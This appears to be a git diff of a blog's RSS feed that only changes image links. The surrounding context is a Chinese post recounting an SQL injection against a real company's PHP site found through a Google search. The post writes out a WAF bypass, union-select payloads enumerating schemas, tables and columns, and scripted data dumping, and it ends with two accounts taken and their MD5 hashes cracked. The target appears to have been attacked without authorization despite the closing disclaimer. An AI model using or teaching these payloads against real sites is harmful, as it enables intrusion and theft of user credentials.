@@ -15,7 +15,7 @@
         <guid>http://gucheng.me/p/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%9C%9F%E5%AE%9E%E7%AB%99%E7%82%B9sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</guid>
         <description>&lt;h3 id=&#34;发现方式&#34;&gt;发现方式
 &lt;/h3&gt;&lt;p&gt;利用goole语法&lt;code&gt;inurl=&amp;quot;id=&amp;quot;&lt;/code&gt;发现某公司php站点，在id后输入&lt;code&gt;1&#39; and &#39;a&#39;=&#39;a&#39;--&lt;/code&gt;显示被waf拦截&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;C:%5cUsers%5c%e5%a4%a9%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20240911115620840.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911115620840.png&#34;
 	
 	
 	
@@ -27,7 +27,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;这个waf我去搜了一下是西数的一个waf，挺拉的&lt;/p&gt;
 &lt;p&gt;经过尝试发现是空格被过滤了，于是将空格用+替换。输入&lt;code&gt;1&#39;+and+&#39;a&#39;=&#39;a&#39;--&lt;/code&gt;后页面报错，说明存在sql注入漏洞&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;C:%5cUsers%5c%e5%a4%a9%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20240911115215785.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911115215785.png&#34;
 	
 	
 	
@@ -66,7 +66,7 @@
 &lt;p&gt;构造payload&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;?id=-1+union+select+schema_name+from+information_schema.schemata+limit+0,1--&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;发现只有两个库，其中一个还是系统库(°ー°〃)&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;C:%5cUsers%5c%e5%a4%a9%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20240911121133922.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911121133922.png&#34;
 	
 	
 	
@@ -76,7 +76,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;C:%5cUsers%5c%e5%a4%a9%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20240911121150852.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911121150852.png&#34;
 	
 	
 	
@@ -91,7 +91,7 @@
 &lt;h3 id=&#34;查表&#34;&gt;查表
 &lt;/h3&gt;&lt;p&gt;构造payload&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;?id=-1+union+select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1--&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;C:%5cUsers%5c%e5%a4%a9%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20240911121503106.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911121503106.png&#34;
 	
 	
 	
@@ -108,7 +108,7 @@
 &lt;p&gt;构造payload&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;?id=-1+union+select+column_name+from+information_schema.columns+where+table_name=(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+n,1)+and+table_schema=database()+limit+0,1--&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;然后写入脚本自动化查询每张表的列名&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;C:%5cUsers%5c%e5%a4%a9%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20240911122645544.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911122645544.png&#34;
 	
 	
 	
@@ -125,7 +125,7 @@
 &lt;p&gt;&lt;code&gt;-1+union+select+{data[i]}+from+Sanying.{km}&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;这里是从脚本里面复制出来的，我是先把列名处理成列表&lt;/p&gt;
 &lt;p&gt;这里因为不太会协调这些数据的位置处理输出到xlsx，有些列还是空的，所以我只能半自动化手动填数据到excel，有大佬的话浇浇我！&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;C:%5cUsers%5c%e5%a4%a9%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20240911123931868.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911123931868.png&#34;
 	
 	
 	
@@ -137,7 +137,16 @@
 &gt;&lt;/p&gt;
 &lt;h3 id=&#34;成果&#34;&gt;成果
 &lt;/h3&gt;&lt;p&gt;最后就是这样，拿到了两个账号和一些信息，这库也是真的老了，十几年前的了，密码还是用的md5，但是最近又有人登录。后面利用hashcat和在线网站成功解出两个md5哈希，也算是稍有收获！&lt;/p&gt;
-&lt;p&gt;![68c8be9ac6e92351d64af7ad05e237be](C:\Users\天\Documents\Tencent Files\2477231995\nt_qq\nt_data\Pic\2024-09\Ori\68c8be9ac6e92351d64af7ad05e237be.png)&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/68c8be9ac6e92351d64af7ad05e237be.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;68c8be9ac6e92351d64af7ad05e237be&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;h3 id=&#34;免责声明&#34;&gt;免责声明：
 &lt;/h3&gt;&lt;p&gt;目的：本文旨在分享有关网络安全渗透知识的信息，以促进对网络安全的理解和提高个人和组织的安全意识。这些知识和技术应仅用于合法的、授权的安全测试和红队操作，并遵守适用的法律和道德规范。&lt;/p&gt;
 &lt;p&gt;法律合规：在参考本文所提供的渗透测试和攻击技术时，请确保遵守您所在国家或地区的法律法规。未经合法授权和明确许可，禁止使用这些知识和技术从事非法活动，如未经授权的入侵、数据盗取、破坏性攻击等。&lt;/p&gt;
